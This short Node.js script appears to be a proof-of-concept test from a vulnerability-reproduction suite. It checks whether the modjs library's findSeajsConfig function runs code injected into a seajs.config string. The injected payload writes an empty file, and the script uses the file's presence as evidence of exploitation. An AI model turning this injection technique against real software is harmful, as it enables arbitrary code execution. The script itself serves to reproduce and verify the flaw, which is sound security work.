if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const sea = require("modjs/lib/utils/sea");
const path = "./modjs";
file_exist = fs.existsSync(path);
console.log("a", file_exist);
try {
	sea.findSeajsConfig(
		"seajs.config({a: require('fs').writeFileSync('./modjs', '')})",
	);
} catch (error) {}
file_exist = fs.existsSync(path);
fs.unlink(path, function (err) {});
console.log("b", file_exist);

if (file_exist) {
	process.exit(0);
} else {
	process.exit(82);
}
